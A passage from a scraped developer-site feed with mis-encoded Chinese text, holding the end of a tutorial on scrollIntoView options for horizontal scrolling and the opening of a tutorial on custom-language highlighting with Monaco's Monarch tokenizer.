  overflow-<span class="hljs-attr">x</span>: auto;
  overflow-<span class="hljs-attr">y</span>: hidden; <span class="hljs-comment">/* æ˜ç¡®ç¦æ­¢å‚ç›´æ»šåŠ¨ */</span>
  scrollbar-<span class="hljs-attr">width</span>: thin; <span class="hljs-comment">/* ç°ä»£æµè§ˆå™¨ */</span>
  -webkit-overflow-<span class="hljs-attr">scrolling</span>: touch; <span class="hljs-comment">/* iOS å¹³æ»‘æ»šåŠ¨ */</span>
}
</code></pre>
<h3 data-id="heading-23">Q2ï¼šå¦‚ä½•ç¡®ä¿åœ¨ç§»åŠ¨ç«¯ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œï¼Ÿ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">mobileSafeScroll</span>(<span class="hljs-params">element</span>) {
  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦åœ¨ç§»åŠ¨ç«¯</span>
  <span class="hljs-keyword">const</span> isMobile = <span class="hljs-regexp">/iPhone|iPad|iPod|Android/i</span>.<span class="hljs-title function_">test</span>(navigator.<span class="hljs-property">userAgent</span>);
  
  element.<span class="hljs-title function_">scrollIntoView</span>({
    <span class="hljs-attr">behavior</span>: isMobile ? <span class="hljs-string">'auto'</span> : <span class="hljs-string">'smooth'</span>, <span class="hljs-comment">// ç§»åŠ¨ç«¯å¯èƒ½ä¸æ”¯æŒsmooth</span>
    <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
    <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>
  });
  
  <span class="hljs-comment">// ç§»åŠ¨ç«¯é¢å¤–å¤„ç†</span>
  <span class="hljs-keyword">if</span> (isMobile) {
    <span class="hljs-comment">// é˜²æ­¢æ»šåŠ¨ç©¿é€</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">'hidden'</span>;
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">''</span>;
    }, <span class="hljs-number">300</span>);
  }
}
</code></pre>
<h3 data-id="heading-24">Q3ï¼šå¦‚ä½•å¤„ç†åµŒå¥—æ»šåŠ¨å®¹å™¨ï¼Ÿ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">scrollInNestedContainer</span>(<span class="hljs-params">element, containerSelector</span>) {
  <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(containerSelector);
  <span class="hljs-keyword">if</span> (!container) <span class="hljs-keyword">return</span>;
  
  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ æ˜¯å¦åœ¨å®¹å™¨å†…</span>
  <span class="hljs-keyword">if</span> (container.<span class="hljs-title function_">contains</span>(element)) {
    <span class="hljs-comment">// è®¡ç®—ç›¸å¯¹ä½ç½®</span>
    <span class="hljs-keyword">const</span> containerRect = container.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> elementRect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    
    <span class="hljs-keyword">const</span> scrollLeft = elementRect.<span class="hljs-property">left</span> - containerRect.<span class="hljs-property">left</span> + container.<span class="hljs-property">scrollLeft</span>;
    
    container.<span class="hljs-title function_">scrollTo</span>({
      <span class="hljs-attr">left</span>: scrollLeft - (container.<span class="hljs-property">clientWidth</span> - elementRect.<span class="hljs-property">width</span>) / <span class="hljs-number">2</span>,
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>
    });
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// ä½¿ç”¨é»˜è®¤æ–¹æ³•</span>
    element.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
      <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>
    });
  }
}
</code></pre>
<h2 data-id="heading-25">æ€»ç»“</h2>
<p>é€šè¿‡ä»Šå¤©çš„å®è·µï¼Œæˆ‘ä»¬å­¦åˆ°äº†ä¸€ä¸ªç®€å•è€Œå¼ºå¤§çš„æŠ€å·§ï¼š<strong>ä½¿ç”¨ <code>block: 'nearest'</code> å¯ä»¥é¿å… <code>scrollIntoView</code> çš„æ„å¤–æ»šåŠ¨è¡Œä¸º</strong>ã€‚</p>
<h3 data-id="heading-26">æ ¸å¿ƒè¦ç‚¹</h3>
<ol>
<li><strong>é—®é¢˜æ ¹æº</strong>ï¼š<code>scrollIntoView</code> é»˜è®¤çš„ <code>block: 'start'</code> å¯èƒ½å¯¼è‡´ä¸å¿…è¦çš„å‚ç›´æ»šåŠ¨</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šæ”¹ç”¨ <code>block: 'nearest'</code> ä¿æŒå‚ç›´ä½ç½®ä¸å˜</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ¨ªå‘æ»šåŠ¨å®¹å™¨ã€Tabç»„ä»¶ã€è½®æ’­å›¾ç­‰</li>
<li><strong>å…¼å®¹æ€§</strong>ï¼šä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒï¼Œå¹³æ»‘æ»šåŠ¨éœ€è¦é™çº§å¤„ç†</li>
</ol>
<h3 data-id="heading-27">æ¨èå†™æ³•</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯¹äºæ¨ªå‘æ»šåŠ¨ï¼Œæ¨èä½¿ç”¨ï¼š</span>
element.<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
  <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,    <span class="hljs-comment">// é¿å…å‚ç›´æ»šåŠ¨</span>
  <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>     <span class="hljs-comment">// æ°´å¹³å±…ä¸­</span>
});

<span class="hljs-comment">// å¯¹äºçºµå‘æ»šåŠ¨ï¼Œæ¨èä½¿ç”¨ï¼š</span>
element.<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
  <span class="hljs-attr">block</span>: <span class="hljs-string">'center'</span>,     <span class="hljs-comment">// å‚ç›´å±…ä¸­</span>
  <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>    <span class="hljs-comment">// é¿å…æ°´å¹³æ»šåŠ¨</span>
});
</code></pre>
<p>æœ‰æ—¶å€™ï¼Œæœ€ç®€å•çš„ä¸€è¡Œä»£ç è°ƒæ•´ï¼Œå°±èƒ½è§£å†³å›°æ‰°å·²ä¹…çš„é—®é¢˜ã€‚å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©ä½ æ›´å¥½åœ°æŒæ¡ <code>scrollIntoView</code> çš„ä½¿ç”¨æŠ€å·§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•åœ¨ monaco ä¸­å®ç°è‡ªå®šä¹‰è¯­è¨€çš„é«˜äº®]]></title>    <link>https://juejin.cn/post/7592452108797296683</link>    <guid>https://juejin.cn/post/7592452108797296683</guid>    <pubDate>2026-01-07T13:39:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592452108797296683" data-draft-id="7591407298415034374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•åœ¨ monaco ä¸­å®ç°è‡ªå®šä¹‰è¯­è¨€çš„é«˜äº®"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,ç¼–ç¨‹è¯­è¨€"/> <meta itemprop="datePublished" content="2026-01-07T13:39:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å²³å‡ºäºå±±"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476454536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•åœ¨ monaco ä¸­å®ç°è‡ªå®šä¹‰è¯­è¨€çš„é«˜äº®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476454536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å²³å‡ºäºå±±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T13:39:33.000Z" title="Wed Jan 07 2026 13:39:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>å¦‚ä¸‹ä»£ç ï¼Œåœ¨ monaco ä¸Šæ³¨å†Œ <code>mylang</code> è¯­è¨€ï¼Œå¹¶è®¾ç½®è¯æ³•åˆ†æè§„åˆ™ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ³¨å†Œè¯­è¨€</span>
monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">register</span>({ <span class="hljs-attr">id</span>: <span class="hljs-string">'myLang'</span> });
<span class="hljs-comment">// è®¾ç½®è¯æ³•åˆ†æè§„åˆ™</span>
monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">setMonarchTokensProvider</span>(<span class="hljs-string">'myLang'</span>, {
  <span class="hljs-attr">tokenizer</span>: {}
});
<span class="hljs-comment">// é¢œè‰²ä¸»é¢˜è®¾ç½®</span>
monaco.<span class="hljs-property">editor</span>.<span class="hljs-title function_">defineTheme</span>(<span class="hljs-string">'logTheme'</span>, {});
</code></pre>
<p>å…¶ä¸­ <code>tokenizer</code> å¯¹è±¡å°±æ˜¯ç”¨æ¥æè¿°ä¸€ä¸ªè¯­è¨€å®šä¹‰çš„ JSON å¯¹è±¡ã€‚</p>
<p>Monaco Editor çš„ <strong>Tokenizerï¼ˆåˆ†è¯å™¨ï¼‰</strong> æ˜¯å®ç°ä»£ç é«˜äº®çš„æ ¸å¿ƒç»„ä»¶ã€‚å®ƒé€šè¿‡ <strong>Monarch</strong> åº“ï¼ˆä¸€ä¸ªåŸºäº JSON çš„å£°æ˜å¼è¯­æ³•ï¼‰å°†æºä»£ç æ–‡æœ¬æ‹†åˆ†ä¸ºä¸€ç³»åˆ—å¸¦æœ‰â€œç±»å‹æ ‡ç­¾â€çš„ <strong>Token</strong>ï¼ˆè®°å·ï¼‰ï¼Œéšåç¼–è¾‘å™¨æ ¹æ®ä¸»é¢˜ï¼ˆThemeï¼‰ä¸ºè¿™äº›æ ‡ç­¾æ¶‚ä¸Šä¸åŒçš„é¢œè‰²ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å°±é€æ­¥æ¥äº†è§£ä¸‹è¿™ä¸ªè§„èŒƒã€‚</p>
<h2 data-id="heading-0">è¯æ³•åˆ†æç®€å•åŸç†</h2>
<p>Monaco çš„ Tokenizer æ˜¯ä¸€ä¸ª<strong>çŠ¶æ€æœº</strong>ã€‚å®ƒé€è¡Œæ‰«æä»£ç ï¼Œå¹¶å§‹ç»ˆå¤„äºæŸä¸ªç‰¹å®šçš„â€œçŠ¶æ€â€ä¸­ï¼ˆé»˜è®¤åˆå§‹çŠ¶æ€ä¸º <code>root</code>ï¼‰ã€‚å…¶æ ¸å¿ƒæ¦‚å¿µæœ‰ï¼š</p>
<ul>
<li>
<p><strong>çŠ¶æ€ï¼ˆStatesï¼‰</strong> ï¼šè§£æå™¨å§‹ç»ˆå¤„äºæŸä¸ªç‰¹å®šçŠ¶æ€ï¼ˆåˆå§‹ä¸º <code>root</code>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ­£åˆ™åŒ¹é…ï¼ˆRegex Matchingï¼‰</strong> ï¼šåœ¨å½“å‰çŠ¶æ€ä¸‹ï¼ŒæŒ‰é¡ºåºç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å½“å‰è¡Œã€‚</p>
</li>
<li>
<p><strong>åŠ¨ä½œï¼ˆActionsï¼‰</strong> ï¼šåŒ¹é…æˆåŠŸåæ‰§è¡Œæ“ä½œï¼Œå¦‚èµ‹äºˆ Token ç±»å‹ã€åˆ‡æ¢çŠ¶æ€ï¼ˆ<code>next</code>ï¼‰æˆ–æ¨å…¥çŠ¶æ€æ ˆï¼ˆ<code>push</code>ï¼‰ã€‚</p>
</li>
</ul>
<h2 data-id="heading-1">è¯æ³•åˆ†æç®€å•æ•™ç¨‹</h2>
<h3 data-id="heading-2">åˆçº§ï¼šåŸºç¡€åŒ¹é…ï¼ˆçº¿æ€§è§„åˆ™ï¼‰</h3>
<p>è¿™æ˜¯æœ€ç®€å•çš„å½¢æ€ï¼Œé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ç›´æ¥ç»™åŒ¹é…åˆ°çš„æ–‡å­—æ‰“ä¸Šâ€œæ ‡ç­¾â€ï¼ˆToken Typeï¼‰ã€‚</p>
<p>æ­¤æ—¶ Tokenizer åƒä¸€ä¸ªç®€å•çš„è¿‡æ»¤å™¨ï¼Œæ‰«æåˆ°å“ªç®—å“ªï¼Œæ²¡æœ‰â€œä¸Šä¸‹æ–‡â€æ¦‚å¿µã€‚</p>
<pre><code class="hljs language-js" lang="js">monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">setMonarchTokensProvider</span>(<span class="hljs-string">'myLang'</span>, {
  <span class="hljs-attr">tokenizer</span>: {
    <span class="hljs-attr">root</span>: [
      [<span class="hljs-regexp">/\b(if|else|return)\b/</span>, <span class="hljs-string">"keyword"</span>], <span class="hljs-comment">// åŒ¹é…å…³é”®å­—</span>
      [<span class="hljs-regexp">/[0-9]+/</span>, <span class="hljs-string">"number"</span>],               <span class="hljs-comment">// åŒ¹é…æ•°å­—</span>
      [<span class="hljs-regexp">/[+-*/]/</span>, <span class="hljs-string">"operator"</span>],            <span class="hljs-comment">// åŒ¹é…è¿ç®—ç¬¦</span>
      [<span class="hljs-regexp">/[a-zA-Z_]\w*/</span>, <span class="hljs-string">"identifier"</span>],     <span class="hljs-comment">// åŒ¹é…å˜é‡å</span>
    ]
  }
});
</code></pre>
<h3 data-id="heading-3">ä¸­çº§ï¼šçŠ¶æ€åˆ‡æ¢ï¼ˆå¤„ç†å­—ç¬¦ä¸²ï¼‰</h3>
